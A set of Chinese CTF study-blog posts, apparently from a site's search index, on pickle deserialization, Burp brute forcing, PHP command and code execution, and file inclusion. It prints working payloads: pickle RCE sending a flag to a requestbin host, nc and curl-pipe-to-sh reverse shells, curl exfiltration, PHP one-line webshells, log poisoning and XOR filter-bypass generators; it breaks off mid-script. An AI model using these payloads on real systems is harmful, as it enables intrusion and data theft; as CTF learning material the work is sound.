&#x27;r&#x27;).read()&#125;&#125;//x的含义是可以为任意字母，不仅仅限于x\n\npython反序列化这部分参考了这位大佬的文章\n简介python的序列化和反序列化是将一个类对象向字节流转化从而进行存储和传输, 然后使用的时候再将字节流转换回原始的对象的一个过程和php的序列化和反序列化其实差不多, python中反序列化一般有两种方式:pickle和json模块, 前者是python特有的格式, 后者是json通用的格式\n相较于php反序列化的灵活多样的利用, python反序列化主要涉及这么几个概念:pickle,pvm,__reduce__魔术方法, 本文主要来看pickle模块的反序列化漏洞问题\npickle可以用于python特有的类型和python的数据类型之间进行转换(所有python数据类型)\npython提供两个模块实现序列化: cpickle和pickle 这两个模块功能是一样的, 区别在于cpickle是C语言写的, 速度快, pickle是python写的, 速度慢. 在python3中已经没有cpickle模块, pickle有如下四种函数操作方法\n\npickle.dump(obj,file) : 将对象序列化后保存到文件\npickle.load(file) : 读取文件, 将文件中的序列化内容反序列化为对象\npickle.dumps(obj) : 将对象序列化成字符串格式的字节流\npickle.loads(bytes_obj) : 将字符串格式的字节流反序列化为对象\n\n魔术方法:\n\nreduce() 反序列化时调用\nreduce_ex() 反序列化时调用\nsetstate() 反序列化时调用\ngetstate() 反序列化时调用\n\n简单实用例子一\nimport pickleclass Demo():    def __init__(self, name=&#x27;charmersix&#x27;):        self.name = nameprint(&#x27;序列化&#x27;)a = pickle.dumps(Demo())print(a)print(&#x27;反序列化&#x27;)b = pickle.loads(pickle.dumps(Demo())).nameprint(b)\n\n\n例子二\nimport pickleimport osclass A(object):    def __reduce__(self):        print(&#x27;反序列化调用&#x27;)        return (os.system,(&#x27;calc&#x27;,))#反序列化魔术方法调用__reduce__()a = A()p_d = pickle.dumps(a)#序列化pickle.loads(p_d)#反序列化并调用__reduce__print(p_d)\n\n\n\n\n在第六行中，逗号的作用是将元组中的两个元素分开，以便作为参数传递给__reduce__方法。这个元组的第一个元素是一个可调用的对象（函数或类），而第二个元素是一个参数元组，其中包含传递给该可调用对象的参数。在这种情况下，元组中的第一个元素是os.system函数，第二个元素是字符串’calc’，表示将在反序列化期间执行的命令。\n\n\n例子3\nimport pickleimport osclass SerializePerson():    def __init__(self, name):        self.name = name    def __setstate__(self ,name):        os.system(&#x27;calc&#x27;)tmp = pickle.dumps(SerializePerson(&#x27;tom&#x27;))print(tmp)pickle.loads(tmp)#反序列化并调用__setstate__\n\n\nPVM组成部分pvm由三个部分组成:\n\n指令处理器: 从流中读取opcode和参数, 并对其进行解释处理. 重复这个动作, 直到遇到.这个结束符后停止, 最终留在栈顶的值将被作为反序列化对象返回\n栈区(stack): 由python的list实现, 被用来临时存储数据/参数以及对象, 在不断的进出栈过程中完成对数据流的反序列化操作, 并最终在栈顶生成反序列化结果\n标签区(memo): 由python的dict实现, 为pvm的整个生命周期提供存储\n\n执行流程首先, pvm会把源码编译成字节码, 字节码是python语言特有的一种表现形式, 它不是二进制机器码, 需要进一步编译才能被机器执行. 如果python进程在主机上有写入权限, 那么它会把程序字节码保存为一个以.pyc为扩展名的文件, 如果没有写入权限, 则python进程会在内存马中生成字节码, 在程序执行结束后被自动丢弃\n一般来说, 在构建程序时最好给Python进程在主机上的写入权限, 这样只要源代码没有改变, 生成的.pyc文件就可以被重复利用, 提高执行效率, 同时隐藏源代码\n然后, Python进程会把编译好的字节码转发到PVM(Python虚拟机)中, PVM会循环迭代执行字节码指令, 直到所有操作被完成\n指令集这里贴一下官方文档\n当前用于pickling的协议有6种, 使用的协议版本越高, 读取生成的pickle所需的python版本越新\n\nv0版协议是原始的人类可读协议, 并且向后兼容早期版本的python\nv1版协议是较早的二进制格式, 它也与早期版本的python兼容\nv2版协议是在python2.3中引入的, 它为存储new-style class提供了更高效的机制, 参阅PEP 307\nv3版协议添加于python3.0, 他具有对bytes对象的显示支持, 且无法被python2.x打开, 这是目前默认使用的协议, 也是在要求与其他python3版本兼容时的推荐协议\nv4版协议添加于python3.4, 它支持存储非常大的对象, 能存储更多种类的对象, 还包括一些针对数据格式的优化, 参阅PEP 3154\nv5版协议添加于python3.8, 它支持外带数据, 加速带内数据处理\n\n# Pickle opcodes.  See pickletools.py for extensive docs.  The listing# here is in kind-of alphabetical order of 1-character pickle code.# pickletools groups them by purpose.MARK           = b&#x27;(&#x27;   # push special markobject on stackSTOP           = b&#x27;.&#x27;   # every pickle ends with STOPPOP            = b&#x27;0&#x27;   # discard topmost stack itemPOP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobjectDUP            = b&#x27;2&#x27;   # duplicate top stack itemFLOAT          = b&#x27;F&#x27;   # push float object; decimal string argumentINT            = b&#x27;I&#x27;   # push integer or bool; decimal string argumentBININT         = b&#x27;J&#x27;   # push four-byte signed intBININT1        = b&#x27;K&#x27;   # push 1-byte unsigned intLONG           = b&#x27;L&#x27;   # push long; decimal string argumentBININT2        = b&#x27;M&#x27;   # push 2-byte unsigned intNONE           = b&#x27;N&#x27;   # push NonePERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string argBINPERSID      = b&#x27;Q&#x27;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#x27;R&#x27;   # apply callable to argtuple, both on stackSTRING         = b&#x27;S&#x27;   # push string; NL-terminated string argumentBINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argumentSHORT_BINSTRING= b&#x27;U&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#x27;V&#x27;   # push Unicode string; raw-unicode-escaped&#x27;d argumentBINUNICODE     = b&#x27;X&#x27;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#x27;a&#x27;   # append stack top to list below itBUILD          = b&#x27;b&#x27;   # call __setstate__ or __dict__.update()GLOBAL         = b&#x27;c&#x27;   # push self.find_class(modname, name); 2 string argsDICT           = b&#x27;d&#x27;   # build a dict from stack itemsEMPTY_DICT     = b&#x27;&#125;&#x27;   # push empty dictAPPENDS        = b&#x27;e&#x27;   # extend list on stack by topmost stack sliceGET            = b&#x27;g&#x27;   # push item from memo on stack; index is string argBINGET         = b&#x27;h&#x27;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#x27;i&#x27;   # build &amp; push class instanceLONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte argLIST           = b&#x27;l&#x27;   # build list from topmost stack itemsEMPTY_LIST     = b&#x27;]&#x27;   # push empty listOBJ            = b&#x27;o&#x27;   # build &amp; push class instancePUT            = b&#x27;p&#x27;   # store stack top in memo; index is string argBINPUT         = b&#x27;q&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#x27;r&#x27;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#x27;s&#x27;   # add key+value pair to dictTUPLE          = b&#x27;t&#x27;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#x27;)&#x27;   # push empty tupleSETITEMS       = b&#x27;u&#x27;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encodingTRUE           = b&#x27;I01\\n&#x27;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#x27;I00\\n&#x27;  # not an opcode; see INT docs in pickletools.py# Protocol 2PROTO          = b&#x27;\\x80&#x27;  # identify pickle protocolNEWOBJ         = b&#x27;\\x81&#x27;  # build object by applying cls.__new__ to argtupleEXT1           = b&#x27;\\x82&#x27;  # push object from extension registry; 1-byte indexEXT2           = b&#x27;\\x83&#x27;  # ditto, but 2-byte indexEXT4           = b&#x27;\\x84&#x27;  # ditto, but 4-byte indexTUPLE1         = b&#x27;\\x85&#x27;  # build 1-tuple from stack topTUPLE2         = b&#x27;\\x86&#x27;  # build 2-tuple from two topmost stack itemsTUPLE3         = b&#x27;\\x87&#x27;  # build 3-tuple from three topmost stack itemsNEWTRUE        = b&#x27;\\x88&#x27;  # push TrueNEWFALSE       = b&#x27;\\x89&#x27;  # push FalseLONG1          = b&#x27;\\x8a&#x27;  # push long from &lt; 256 bytesLONG4          = b&#x27;\\x8b&#x27;  # push really big long_tuplesize2code = [EMPTY_TUPLE, TUPLE1, TUPLE2, TUPLE3]# Protocol 3 (Python 3.x)BINBYTES       = b&#x27;B&#x27;   # push bytes; counted binary string argumentSHORT_BINBYTES = b&#x27;C&#x27;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytes# Protocol 4SHORT_BINUNICODE = b&#x27;\\x8c&#x27;  # push short string; UTF-8 length &lt; 256 bytesBINUNICODE8      = b&#x27;\\x8d&#x27;  # push very long stringBINBYTES8        = b&#x27;\\x8e&#x27;  # push very long bytes stringEMPTY_SET        = b&#x27;\\x8f&#x27;  # push empty set on the stackADDITEMS         = b&#x27;\\x90&#x27;  # modify set by adding topmost stack itemsFROZENSET        = b&#x27;\\x91&#x27;  # build frozenset from topmost stack itemsNEWOBJ_EX        = b&#x27;\\x92&#x27;  # like NEWOBJ but work with keyword only argumentsSTACK_GLOBAL     = b&#x27;\\x93&#x27;  # same as GLOBAL but using names on the stacksMEMOIZE          = b&#x27;\\x94&#x27;  # store top of the stack in memoFRAME            = b&#x27;\\x95&#x27;  # indicate the beginning of a new frame# Protocol 5BYTEARRAY8       = b&#x27;\\x96&#x27;  # push bytearrayNEXT_BUFFER      = b&#x27;\\x97&#x27;  # push next out-of-band bufferREADONLY_BUFFER  = b&#x27;\\x98&#x27;  # make top of stack readonly\n\n上文谈到了opcode是有多个版本的, 在进行序列化时可以通过protocol=num来选择opcode的版本, 指定的版本必须小于等于5.\n漏洞出现位置\n通常在解析认证token/session的时候, 现在很多web服务都在使用redis/mongodb/memcached等来存储session等状态信息\n可能将对象pickle后存储成磁盘文件\n可能将对象pickle后在网络中传输\n\n\n其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的\n\n漏洞利用方式漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化, 反序列化后产生的对象会在结束时触发__reduce__()函数从而触犯恶意代码\n简单来说, __reduce__()魔术方法类似于php中的__wakeup()方法, 在反序列化时会调用__reduce__()魔术方法\n\n如果返回值是一个字符串, 那么将会去当前作用域中查找字符串值对应名字的对象, 将其反序列化后返回\n如果返回的是一个元组, 要求是2-6个参数(python3.8新加入元组的第六项)\n第一个参数是可调用的对象.\n第二个是该对象所需的参数元组, 如果可调用对象不接受参数则必须提供一个空元组.\n第三个是用于表示对象的状态的可选元素, 将被传给前述的__setstate__()方法, 如果对象没有此方法, 则这个元素必须是字典类型并会被添加至__dict__属性中.\n第四个是用于返回连续项的迭代器的可选元素.\n第五个是用于返回连续键值对的迭代器的可选元素.\n第六个是一个带有(obj, state)签名的可调用对象的可选元素.\n\n\n\n基本payloadimport osimport pickleclass Demo(object):    def __reduce__(self):        shell = &#x27;/bin/sh&#x27;        return (os.system,(shell,))demo = Demo()pickle.loads(pickle.dumps(demo))\n\n\n防御方法\n采用用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法\n进行反序列化操作之前进行严格的过滤, 若采用的是pickle库可采用装饰器实现\n在传递序列化对象前请进行签名或者加密，防止篡改和重播\n如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据\n不要再不守信任的通道中传递 pcikle 序列化对象\n将 pickle 加载的数据列入白名单\n\n做俩题这里开个ctfshow的web277和web278做一做\n源码中可以看到hint\n然后这里我们尝试构造一下payload\nimport base64import pickleimport osclass Demo(object):    def __reduce__(self):        shell = &#x27;whoami&#x27;        return (os.system,(shell,))demo = Demo()payload = pickle.dumps(demo)print(base64.b64encode(payload))\n\n\n并没有打通, 尝试dns外带也不行, 这里看网上大佬提供了一种 RequestBin方法, 这里借用buu的requestbin平台\nimport base64import pickleimport osclass Demo(object):    def __reduce__(self):        #shell = &#x27;wget `id|base64`.wjqfgx.dnslog.cn&#x27;        shell = &#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;        return (os.system, (shell,))demo = Demo()payload = pickle.dumps(demo)print(base64.b64encode(payload))\n\n额…这里我也没带出来\n那么这二者有什么区别呢, 虽然结果是都没带出来\n\nRequestBin和DNSLog都是用于测试和调试网络应用程序的工具，但它们的主要区别在于它们所记录的信息类型。\nRequestBin外带是一种HTTP请求捕获工具，可以捕获来自任何来源的HTTP请求，并为您提供一个临时网址，在这个网址上，您可以查看请求的详细信息，包括请求头、请求参数等。RequestBin外带通常用于测试Webhook以及与第三方API的交互等。\nDNSLog外带则是一种用于捕获DNS请求的工具，它可以捕获通过您指定的DNS服务器发送的所有DNS请求，并将其记录下来。DNSLog外带通常用于发现恶意软件和网络攻击，例如域名劫持、DNS投毒等情况。\nRequestBin适用于检查HTTP请求，而DNSLog适用于检查所有类型的网络请求。RequestBin需要向外部服务器发送请求来获取请求的详细信息，而DNSLog则不需要连接到外部服务器即可捕获网络请求。\n\n这里我们采用第三种方法, 反弹shell也失败, 那么就可能是我们payload的问题了, 有可能是没有system模块, 这里我们换一个payload\nimport pickleimport osimport base64class Demo():    def __reduce__(self):        return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;wget http://http.requestbin.buuoj.cn/1h6hdxc1?c=`cat fla*`&#x27;).read()&quot;,))        #return (eval,(&quot;__import__(&#x27;os&#x27;).popen(&#x27;nc ip port -e /bin/sh&#x27;).read()&quot;,))demo = Demo()ctf = pickle.dumps(demo)#df = pickle.loads(demo)print(base64.b64encode(ctf))\n\n试了几次不能用bash,最后用了/bin/sh,因为环境里面没有装bash,得不到响应nc连上就会自动断开\n\n\n","tags":["Web","Study","Python","SSTI","Flask","pickle","py反序列化"]},{"title":"Web_1_简单信息搜集+burp基本使用","url":"/2022/09/02/web_1/","content":"第一节  初始化学习0x1给自己起一个响亮的花名0x2分队两队互相激励\n0x3记笔记/blogwanan师傅教搭建blog了，应该已经搭好了\n0x4环境&amp;&amp;约定环境有一台电脑\n约定flag 题目答案\npoc 漏洞演示，不具有工具性\nexp 直接进行漏洞利用\n脚本 自动化代码\n第二节 认识漏洞0x1 什么是漏洞WEB漏洞通常是指网站程序上的漏洞，可能是由于代码编写者在编写代码时考虑不周全等原因而造成的漏洞，常见的WEB漏洞有Sql注入、Xss漏洞、上传漏洞等。\n摘自百度百科\n0x2 漏洞产生的原因0x3 漏洞的利用\n0x4 做题思路第一步先文件读取，再文件写入，再命令执行\n第二步判断漏洞类型\n第三步找flag\n第三节 信息泄露0x1 类型\n0x2 漏洞利用1 http头部信息\nbaidu.com/1.jsp\nF12 可以看到前端可能是阿帕奇\nbaiducom/index.php\nserver 成为了 BWS/1.1\n2 报错信息3 页面信息4 robots.txt防君子不防小人\n此地无银三百两\n5 .gitgithack\n使用方法\npython githack.py http://charmersix.icu/.git/\n跑完之后会在本地生成一个文件夹，里边有重要信息\n/.git/ 403表示此目录存在\n\n\nbuu题目Nu1l\n第四节 burp suite抓包，爆破\nbp的安装，Java环境，proxy插件\n设置好代理，开启拦截，刷新一下你的浏览器就可以看见抓到的包\n这里我们以bugku的一个题目为例子，演示一下使用bp进行爆破\n题目链接\n现在我们打开题目，开启拦截\n\n然后我们往里填一个自己猜的密码，比如我这里是123456\n点提交，就能看见自己抓的包\n\n这里可以看见我们已经抓到了，我们点鼠标右键，发送到intruder\n来到位置这里，我们可以把admin位置删掉，因为一开始admin给出了，不需要我们爆破\n只需要删除admin两边的§符号即可\n我们继续看下一栏\n\n这里选择简单列表即可，然后导入我们从网上下载的top1000密码，开始爆破\n失败\n通过观察相应包，我们发现，无论是否爆破成功，这里都会通过js告诉你爆破失败\n那我么只需要过滤掉&#123;code: &#39;bugku10000&#39;&#125;就能知道，到底哪个是真正被爆破成功的\n\n然后爆破，就能出密码\n","tags":["Web","Study","burpsuite","F12"]},{"title":"Web_2_PHP命令执行+代码执行","url":"/2022/09/07/web_2/","content":"第一节 php的基础知识0x1 php的基本概念php是网站的一种脚本语言，文件后缀是php，用来写网站，适合中小型网站的开发。\n0x2 php环境的安装php 的运行环境phpstudy\nphp 的开发环境? 区分文件和参数部分\n参数部分 用 &amp; 区分 多个键值对\n单个键值对用 = 分开\n0x3 php写一个hello world&lt;?phpecho &quot;hello world&quot;;?&gt;\n\n0x3 php基础语法$_GET&lt;?php$a=$_GET[&#x27;a&#x27;];echo $a?&gt;\n\n$_POST&lt;?php$a=$_POST[&#x27;a&#x27;];echo $a?&gt;\n$_REQUEST&lt;?phpeval($_REQUEST[1]);?&gt;\n\n当get和post函数被禁用时，可以使用request函数\n函数&lt;?phpfunction add($a,$b)&#123;  return $a+$b;&#125;$a=$_POST[&#x27;a&#x27;];$b=$_POST[&#x27;b&#x27;];$c=add($a,$b);echo $c;?&gt;\n\n危险函数&lt;?php$cmd=$_POST[&#x27;cmd&#x27;];system($cmd);?&gt;\n\n第二节 php的命令执行0x1 什么是命令执行RCE\n0x2 php的command exec函数PHP官方有下面六种函数可以执行系统命令\n\nsystem\npassthru\nexec\nshell_exec\npopen\npcntl_exec4\n执行运算符\necho ``?&gt;\n\n0x3 php的命令执行利用php的命令执行，我们默认讨论的是服务器系统为Linux\nshell 的分号 ; 可以用来分割两条命令\n并列命令&amp;&amp;的url编码(%26%26) 也可以分割两条命令   but &amp;&amp;前的命令成功执行，后面的才会成立\n|| 表示或 ， 可以分割两条命令\nerror_reporting(0); //不显示报错highlight_file(__FILE__); //代码高亮\n\n绕过base64编码绕过如果 flag/cat 等命令被过滤，可以使用正则、其他未被过滤命令、base64编码解码\n`echo dGFjIGZsYWcucGhw | base64 -d`\n\n\n在linux当中反引号也十分常用，也就是 ` 符号。那么反引号是怎么使用的呢？我的理解是凡是打上反引号的命令，首先将反引号内的命令执行一次，然后再将已经执行过的命令得到的结果再执行一次，就可以得到我们反引号的输出\n\n变量拼接绕过关键字a=c;b=at;c=fla;d=g.php;$a$b $&#123;c&#125;$&#123;d&#125;\n\n爆破被过滤的符号符号被过滤可以爆破一下，\n\n\n可以使用{}和冒号: 截取空格\n使用env浏览环境变量，然后截取\n例如GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D\ncmd=tac$&#123;GPG_KEYS:40:1&#125;*\n不回显没办法直接看到回显，可以使用写文件的方式，将结果写到浏览器可以读取的位置，然后访问url+1.txt\n写入文件可以用 &gt; 写入\ndns通道http://www.dnslog.cn/\n当文件过长无法全部回带时，可以部分回带，使用sed -n命令\n可以使用\na=`sed -n &quot;3,4p&quot; fla?.php|base64`;curl $&#123;a:0:10&#125;.dnslog.cn #a中，从0开始截取10个，然后从10再截取，依此类推\n\n当dnslog被过滤时，可以使用\nhttps://requestrepo.com/#/\nhttps://pipedream.com/\ncurl -X POST --data a=`cat ./flag.php` http:/xxxx.com #POSTcurl http://xxx.com/?a=`whoami` #GET\n\n反弹shell以及ctfshow专用反弹shellhttps://your-shell.com/\n时间盲注盲注猜flag\n第三节 php的代码执行0x1 什么是php的代码执行eval(&quot;要执行的代码&quot;); 可以执行参数给的php代码\n可以用?&gt;结束php代码。\n0x2 代码执行和命令执行的区别\n system 命令执行\n shell_exec 命令执行\n eval 代码执行\n\n0x3 php的代码执行是什么格式在php语言中，代码分为三种\n1.函数调用\n函数名 (函数参数1，函数参数2 …);\n2.类方法调用\n类实例 箭头 类方法 ()\n($_GET[1])($_GET[2]); //免杀一句话木马\n\n3.语言结构调用\n0x4 php的代码执行后门一句话木马\n&lt;?phpeval($_POST[1]);?&gt; //蚁剑连接\n\nget转post转接头\n&lt;?phpeval($_GET[1]);?&gt;?1=eval($_POST[2]);\n\n0x5 代码执行的类型\n(&quot;sys&quot;.&quot;tem&quot;)=system\n&lt;script language=&quot;php&quot;&gt;eval($_POST[1])&lt;/script&gt; \n\nphp5.6版本以前的可用\n最短木马：\n&lt;?`$_GET[2]`;&amp;2=\n\n反弹 shell\nnc ip port -e /bin/sh #传统姿势curl https://your-shell.com/ip:port |sh #ctfshow新姿势\n\n烧姿势1.无字母数字命令执行采用文件上传的方式，匹配到temp目录下的文件，在该文件中写入命令执行代码\n这里搬用一下ctfshow师傅写的upload代码\n&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://靶场地址/?cmd=. /???/????????[@-[]&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;upload&quot;&gt;&lt;/form&gt;\n\n匹配临时文件，写入命令，实现命令执行\n这里开一个靶场写一下详细过程\n这里我们把upload.html挂到PHP study\n然后随便传一个.txt\n打开bp，开抓\n\n我们发到repeater\n然后把我们1.txt文件中的内容改成要执行的命令，发包!\n\n成功，如果不成功可以多发几次，因为我们匹配的文件名是未知的，能否正确匹配也是概率事件，多发几次就会成功。\n\n2.无字母数字代码执行这里我们有两个脚本\n作者都来自羽师傅\n首先是一个php\n&lt;?php/*author yu22x*/$myfile = fopen(&quot;xor_rce.txt&quot;, &quot;w&quot;);$contents=&quot;&quot;;for ($i=0; $i &lt; 256; $i++) &#123;         for ($j=0; $j &lt;256 ; $j++) &#123;                 if($i&lt;16)&#123;                        $hex_i=&#x27;0&#x27;.dechex($i);                &#125;                else&#123;                        $hex_i=dechex($i);                &#125;                if($j&lt;16)&#123;                        $hex_j=&#x27;0&#x27;.dechex($j);                &#125;                else&#123;                        $hex_j=dechex($j);                &#125;                $preg = &#x27;/[a-z0-9]/i&#x27;; //根据题目给的正则表达式修改即可                if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j)))&#123;                                        echo &quot;&quot;;    &#125;                  else&#123;                $a=&#x27;%&#x27;.$hex_i;                $b=&#x27;%&#x27;.$hex_j;                $c=(urldecode($a)^urldecode($b));                if (ord($c)&gt;=32&amp;ord($c)&lt;=126) &#123;                        $contents=$contents.$c.&quot; &quot;.$a.&quot; &quot;.$b.&quot;\\n&quot;;                &#125;        &#125;&#125;&#125;fwrite($myfile,$contents);fclose($myfile);\n\n我们把他挂在PHP study，会在本地生成一个xor_rce.txt\n然后是一个python脚本\n# -*- coding: utf-8 -*-# author yu22ximport requestsimport urllibfrom sys import *import osdef action(arg):   s1=&quot;&quot;   s2=&quot;&quot;   for i in arg:       f=open(&quot;xor_rce.txt&quot;,&quot;r&quot;)       while True:           t=f.readline()           if t==&quot;&quot;:               break           if t[0]==i:               #print(i)               s1+=t[2:5]               s2+=t[6:9]               break       f.close()   output=&quot;(\\&quot;&quot;+s1+&quot;\\&quot;^\\&quot;&quot;+s2+&quot;\\&quot;)&quot;   return(output)   while True:   param=action(input(&quot;\\n[+] your function：&quot;) )+action(input(&quot;[+] your command：&quot;))+&quot;;&quot;   print(param)\n\n我们跑一下，在function：和command：下分别填入我们想要执行的命令\n\n然后就会生成一串异或出来的命令，复制执行即可\n这里的(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%08%0f%01%0d%09&quot;^&quot;%7f%60%60%60%60%60&quot;);\n虽然看上去存在一些数字字母，但是都是url编码后的，我们可以解码看一下\n\n\n是一些不可见字符昂\n3.巧用蚁剑插件当脚本小子在这开始我们要准备一个比较新的中国蚁剑，不要像我一样，打开2016版的蚁剑\n\n打开2019版的蚁剑，至少插件商城能用\n装几个插件，这是比较有用的几个，当然根据自己需求在商城里随便装\n\n这里我们不再赘述一句话木马的上传，这时候我们一句话已经连上了，但是无论是读取flag，还是命令执行都没用\n然后，来到上传后的提权/绕过操作\n加载disable_functions,选择第一个LD_PRELOAD，开始\n\n能看到当前目录下生成了一个.antproxy.php\n\n我们直接连这个文件\n\n这时候我们回到终端whoami\n\n\n注意这里不要打成who m ai 👴！\n\n\n然后我们cat试试\n\n没有权限，看来www-data权限还不够，会不会有其他命令，不用root权限，却能代替cat\n这里来一些Linux知识\n\n在linux下我们经常用到的四个应用程序的目录是/bin、/sbin、/usr/bin、/usr/sbin 。而四者存放的文件一般如下：\nbin目录: \nbin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar等。\n/usr/bin目录:\n主要放置一些应用软件工具的必备执行档例如c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等。\n/sbin目录: \n主要放置一些系统管理的必备程序例如:cfdisk、dhcpcd、dump、e2fsck、fdisk、halt、ifconfig、ifup、 ifdown、init、insmod、lilo、lsmod、mke2fs、modprobe、quotacheck、reboot、rmmod、 runlevel、shutdown等。\n/usr/sbin目录: \n放置一些网路管理的必备程序例如:dhcpd、httpd、imap、in.*d、inetd、lpd、named、netconfig、nmbd、samba、sendmail、squid、swap、tcpd、tcpdump等\n综述：\n如果这是用户和管理员必备的二进制文件，就会放在/bin。如果这是系统管理员必备，但是一般用户根本不会用到的二进制文件，就会放在 /sbin。\n相对而言。如果不是用户必备的二进制文件，多半会放在/usr/bin；如果不是系统管理员必备的工具，多半会放在/usr/sbin\n\n\n单纯使用ls命令，显示的内容有限。在实际使用的时候，经常需要搭配一些选项来显示更加丰富的内容，ls常用的附加选项如下表所示：\n-a    显示指定路径中的所有文件，包括隐藏文件-l    显示文件的详细信息，包括文件类型，权限，所属用户，所属用户组，文件大小，上一次修改时间等-h    文件大小以KBytes为单位显示-S    按照文件大小顺序显示，默认从大到小；若要从小到大，可使用-Sr\n\n我们 ls -al /usr/bin发现（这里是fuzz的，其他题也行需要ls -al 其他文件夹，甚至可以ls -al /*/*）\n\n这里的-rwsr-sr-x\n\n第一个s代表的是suid：他表示当其他的用户执行此命令时，可以取得和此文件的所有者一样的权限来取得系统资源第而个s代表的是sgid：他表示当其他的用户执行此命令时，可以取得和此文件的属组一样的权限来取得系统资源\n\n总之，tac 可用\n\n4.蚁剑操作数据库有时候我们蚁剑连上服务器之后, 会发现服务器目录里没有我们想要的数据, 但是网站却有数据库连接, 这时候我们就可以尝试用蚁剑操作数据库\n然后我们点击添加, 选择好数据库类型, 以及密码就可以连接\n\n连接后, 我们根据提示, 执行SQL语句就可以拿到flag\n","tags":["Web","Study","PHP"]},{"title":"Web_3_PHP文件包含","url":"/2022/09/10/web_3/","content":"第一节 php文件包含0x1文件包含的本质指定一个文件，用函数作为接口调用。\n0x2文件包含常见函数include、require、include_once、require_once\n\ninclude 仅仅是包含，包含不到不影响后续执行\nrequire 必须包含成功、包含不到就报错不再执行\ninclude_once 包含一次，再次包含同样文件不再重复包含\nrequire_once 同上包含一次\n\n0x3伪协议计算机中的协议\nphp中的伪协议file协议Linux php中可以自己计算目录，可以存在虚拟目录，可以../很多\nHTTP协议ftp协议php协议php://input直接post发包即可\nphp://filter是一种原封装器\n参数\n\n\n\n名称\n描述\n\n\n\nresource=&lt;要过滤的数据流&gt;\n这个参数是必须的。它指定了你要筛选过滤的数据流。\n\n\nread=&lt;读链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。\n\n\nwrite=&lt;写链的筛选列表&gt;\n该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。\n\n\n&lt;；两个链的筛选列表&gt;\n任何没有以 read= 或 write= 作前缀         的筛选器列表会视情况应用于读或写链。\n\n\n简言之，resource是数据来源，write写入，read读取\nbase64绕过\n?file=php://filter/write=convert.base64-decode/resource=1.php\n这里我们还需要post发包写入的内容，而且要base64编码后\nrot13绕过\n?file=php://filter/write=string.rot13/resource=1.php\n这里同样需要post发包写入的内容，而且要rot13编码后，这里还是推荐CyberChef\ndata协议可以直接执行里边代码内容\ndata://我们可以在官方文档中看到它的语法\nhttp://www.faqs.org/rfcs/rfc2397.html\n?file=data:,&lt;?php phpinfo(); ?&gt;\n第二节 文件包含高级利用文件包含可控点\n文件名可控\n后缀可控\n\n文件名可控意味着可以控制协议头\n这时候优先使用data协议\n后缀可控可以考虑路径跳转，参考file协议\n直接疯狂../../../../之前是提到过Linux对于../能自己计算\nnginx日志包含nginx 的默认路径 /var/log/nginx/access.log\n这里我们要使用user-agent，将恶意代码写到里边，如果是其他方式包含，代码将会被编码导致无法执行\n\n然后再读取/var/log/nginx/access.log执行日志里的恶意代码\n常见出错地方\n\n包含的文件路径错误/var/log/nginx/access.log\n写入的UA语法错误&lt;?php eval($_POST[1]); ?&gt;\n转义错误file_put_contents(&quot;1.php&quot;,&quot;&lt;?php eval($_POST[1]);?&gt;&quot;);\n\n当php语法中在双引号中的符号需要转义，否则判断为空\n即\n&quot;&lt;?php eval($_POST[1]);?&gt;&quot; = &lt;?php eval();?&gt;\n\n这时候我们可以把$符号进行\\转义\n&lt;?php eval(\\$_POST[1]);?&gt;\n\n符号没有进行转义，无法正常执行\n如果发生语法错误，污染了题目环境，只能重开容器\n临时文件包含phpinfo(); 竞争上传，这里有个python2的脚本\n#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port):    TAG=&quot;Security Test&quot;    PAYLOAD=&quot;&quot;&quot;%s\\r&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, 